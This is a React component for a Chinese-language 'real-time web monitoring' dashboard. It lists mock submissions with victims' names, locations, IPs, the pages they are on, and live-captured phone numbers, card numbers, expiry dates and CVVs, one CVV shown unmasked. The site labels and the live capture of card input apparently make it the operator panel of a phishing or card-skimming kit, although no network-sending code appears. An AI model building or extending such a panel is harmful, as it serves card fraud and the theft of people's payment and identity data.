import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { useState } from "react";

interface UserSubmission {
  id: string;
  status: "submitted" | "processing" | "verified" | "pending_review" | "rejected";
  statusText: string;
  submissionType: "personal_info" | "credit_card" | "identity_verification" | "address_proof";
  websiteName: string;
  currentPage: string;
  userName: string;
  userLocation?: string;
  timestamp: string;
  progress?: number;
  progressText?: string;
  riskLevel: "low" | "medium" | "high";
  dataSize?: string;
  fieldsCount?: number;
  ipAddress?: string;
  sessionId?: string;
  // Bin查询结果
  binLookup?: {
    cardType: "debit" | "credit" | "prepaid" | "unknown";
    bank?: string;
    country?: string;
  };
  realtimeInput?: {
    phone?: string;
    cardNumber?: string;
    expiryDate?: string;
    cvv?: string;
  };
}

const submissionData: UserSubmission[] = [
  {
    id: "8021",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "前台页面 1111",
    currentPage: "/payment",
    userName: "赵用户",
    userLocation: "上海市静安区",
    timestamp: "2024-01-20 11:30:25",
    progress: 45,
    progressText: "45%",
    riskLevel: "medium",
    dataSize: "256Kb",
    fieldsCount: 6,
    ipAddress: "192.168.1.120",
    sessionId: "sess_xyz789",
    binLookup: {
      cardType: "debit",
      bank: "招商银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "138****8888",
      cardNumber: "4321 **** **** 5678",
      expiryDate: "09/26",
      cvv: "123"
    }
  },
  {
    id: "13743",
    status: "processing",
    statusText: "处理中",
    submissionType: "personal_info",
    websiteName: "金融服务平台",
    currentPage: "/profile/personal-info",
    userName: "张小明",
    userLocation: "北京市朝阳区",
    timestamp: "2024-01-20 10:25:16",
    progress: 85,
    progressText: "85%",
    riskLevel: "low",
    dataSize: "402Kb",
    fieldsCount: 12,
    ipAddress: "192.168.1.100",
    sessionId: "sess_abc123",
    binLookup: {
      cardType: "credit",
      bank: "中国银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "138****5678",
      cardNumber: "4532 **** **** 1234",
      expiryDate: "12/26",
      cvv: "***"
    }
  },
  {
    id: "13752",
    status: "processing",
    statusText: "处理中",
    submissionType: "credit_card",
    websiteName: "电商购物网",
    currentPage: "/checkout/payment",
    userName: "李小红",
    userLocation: "上海市浦东区",
    timestamp: "2024-01-20 10:23:45",
    progress: 72,
    progressText: "72%",
    riskLevel: "medium",
    dataSize: "156Kb",
    fieldsCount: 8,
    ipAddress: "192.168.1.105",
    binLookup: {
      cardType: "credit",
      bank: "工商银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "189****9876",
      cardNumber: "5555 **** **** 4444",
      expiryDate: "08/25",
      cvv: "***"
    }
  },
  {
    id: "13716",
    status: "pending_review",
    statusText: "待审核",
    submissionType: "identity_verification",
    websiteName: "在线银行系统",
    currentPage: "/kyc/identity-check",
    userName: "王大强",
    userLocation: "广州市天河区",
    timestamp: "2024-01-20 10:20:33",
    riskLevel: "high",
    dataSize: "1.2Mb",
    fieldsCount: 15,
    ipAddress: "192.168.1.88",
    binLookup: {
      cardType: "debit",
      bank: "建设银行",
      country: "CN"
    },
    realtimeInput: {
      phone: "159****3210",
      cardNumber: "6226 **** **** 7890",
      expiryDate: "03/27",
      cvv: "***"
    }
  }
];

const getSubmissionTypeIcon = (type: string) => {
  switch (type) {
    case "personal_info": return "👤";
    case "credit_card": return "💳";
    case "identity_verification": return "🆔";
    case "address_proof": return "🏠";
    default: return "📄";
  }
};

const getSubmissionTypeName = (type: string) => {
  switch (type) {
    case "personal_info": return "个人资料";
    case "credit_card": return "信用卡信息";
    case "identity_verification": return "身份验证";
    case "address_proof": return "地址证明";
    default: return "其他文档";
  }
};

export function WebMonitor() {
  const [expandedItems, setExpandedItems] = useState<Set<string>>(new Set());
  const onlineCount = submissionData.filter(s => s.status === "processing").length;
  const todaySubmissions = submissionData.length;

  const toggleExpanded = (id: string) => {
    const newExpanded = new Set(expandedItems);
    if (newExpanded.has(id)) {
      newExpanded.delete(id);
    } else {
      newExpanded.add(id);
    }
    setExpandedItems(newExpanded);
  };

  return (
    <div className="flex-1 bg-background">
      {/* Header */}
      <div className="border-b border-border bg-white px-6 py-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <span className="text-sm text-muted-foreground">📊 神经网络ML1.15</span>
            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
            <div className="flex items-center gap-2">
              <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                🔴 LIVE - {onlineCount} 在线处理
              </Badge>
              <Badge variant="outline" className="bg-blue-50 text-blue-600 border-blue-200">
                今日提交: {todaySubmissions}
              </Badge>
            </div>
          </div>
          
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🌐 站点管理
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📊 实时统计
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              🔒 安全设定
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              ⚠️ 风险预警
            </Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
              📝 日志查看
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Card Layout with Borders -按照用户要求的信息顺序 */}
        <div className="space-y-4">
          {submissionData.map((submission, index) => (
            <div key={submission.id} className="bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-shadow p-4">
              {/* 顶部：编号、前台页面、正在payment页面 */}
              <div className="flex items-center justify-between mb-3 pb-3 border-b border-gray-100">
                <div className="flex items-center gap-4">
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-muted-foreground">编号:</span>
                    <Badge
                      variant="outline"
                      className={`cursor-pointer text-sm px-2 py-1 font-mono ${
                        submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-300" :
                        submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-300" :
                        submission.status === "verified" ? "bg-green-50 text-green-600 border-green-300" :
                        submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-300" :
                        "bg-red-50 text-red-600 border-red-300"
                      }`}
                      onClick={() => toggleExpanded(submission.id)}
                    >
                      {submission.id}
                    </Badge>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-sm text-muted-foreground">前台页面:</span>
                    <span className="text-sm font-medium">{submission.websiteName}</span>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-sm text-muted-foreground">正在页面:</span>
                    <span className="text-sm font-medium text-blue-600">{submission.currentPage}</span>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <Badge
                    variant="outline"
                    className={`text-xs ${
                      submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
                      submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
                      "bg-green-50 text-green-600 border-green-200"
                    }`}
                  >
                    {submission.riskLevel === "high" ? "高风险" :
                     submission.riskLevel === "medium" ? "中风险" :
                     "低风险"}
                  </Badge>
                  <div className="text-sm text-muted-foreground">{submission.statusText}</div>
                </div>
              </div>

              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
              <div className="grid grid-cols-6 gap-4 mb-3">
                <div>
                  <div className="text-xs text-muted-foreground mb-1">卡的类型</div>
                  {submission.binLookup ? (
                    <div className="flex items-center gap-1">
                      <div className="text-xs text-muted-foreground">💳</div>
                      <Badge
                        variant="outline"
                        className={`text-xs px-2 py-1 ${
                          submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
                          submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
                          submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
                          "bg-gray-50 text-gray-600 border-gray-200"
                        }`}
                      >
                        {submission.binLookup.cardType}
                      </Badge>
                    </div>
                  ) : (
                    <div className="text-sm font-medium">识别中...</div>
                  )}
                </div>

                <div>
                  <div className="text-xs text-muted-foreground mb-1">手机号</div>
                  <div className="text-sm font-mono">
                    {submission.realtimeInput?.phone || 'N/A'}
                  </div>
                </div>

                <div>
                  <div className="text-xs text-muted-foreground mb-1">姓名</div>
                  <div className="text-sm font-medium">
                    {submission.userName}
                  </div>
                </div>

                <div>
                  <div className="text-xs text-muted-foreground mb-1">卡号</div>
                  <div className="text-sm font-mono">
                    {submission.realtimeInput?.cardNumber || 'N/A'}
                  </div>
                </div>

                <div>
                  <div className="text-xs text-muted-foreground mb-1">有效期</div>
                  <div className="text-sm font-mono">
                    {submission.realtimeInput?.expiryDate || 'N/A'}
                  </div>
                </div>

                <div>
                  <div className="text-xs text-muted-foreground mb-1">CVV</div>
                  <div className="text-sm font-mono">
                    {submission.realtimeInput?.cvv || 'N/A'}
                  </div>
                </div>
              </div>

              {/* 底部：处理进度和操作按钮 */}
              <div className="flex items-center justify-between pt-3 border-t border-gray-100">
                <div className="flex items-center gap-4">
                  {submission.progress ? (
                    <div className="min-w-[180px]">
                      <div className="flex justify-between text-xs mb-1">
                        <span className="text-muted-foreground">处理进度</span>
                        <span className="font-medium text-blue-600">{submission.progressText}</span>
                      </div>
                      <Progress value={submission.progress} className="h-2" />
                    </div>
                  ) : (
                    <span className="text-sm text-muted-foreground">等待处理...</span>
                  )}

                  <div className="text-xs text-muted-foreground">
                    数据: {submission.dataSize} • {submission.fieldsCount} 字段 • IP: {submission.ipAddress}
                  </div>
                </div>

                <div className="flex gap-2">
                  <Button variant="outline" size="sm" className="text-xs px-3">
                    监控
                  </Button>
                  <Button variant="outline" size="sm" className="text-xs px-3">
                    暂停
                  </Button>
                  <Button variant="destructive" size="sm" className="text-xs px-3">
                    阻止
                  </Button>
                </div>
              </div>

              {/* 展开的详细信息 */}
              {expandedItems.has(submission.id) && (
                <div className="mt-3 pt-3 border-t border-gray-200 bg-gray-50 -mx-4 -mb-4 px-4 py-3 rounded-b-lg">
                  <h4 className="text-sm font-medium text-foreground mb-2">详细信息</h4>
                  <div className="grid grid-cols-4 gap-4 text-xs">
                    <div>
                      <span className="text-muted-foreground">提交时间: </span>
                      <span className="font-medium">{submission.timestamp}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">用户位置: </span>
                      <span className="font-medium">{submission.userLocation}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">IP地址: </span>
                      <span className="font-medium">{submission.ipAddress}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">会话ID: </span>
                      <span className="font-medium">{submission.sessionId || "N/A"}</span>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* Bottom Summary */}
        <div className="mt-6 pt-4 border-t border-border">
          <div className="text-xs text-muted-foreground">
            共监控 {submissionData.length} 个站点提交 • 今日新增 {todaySubmissions} 条 • 平均处理时长 3.2 分钟 • 验证通过率 82%
          </div>
        </div>
      </div>
    </div>
  );
}
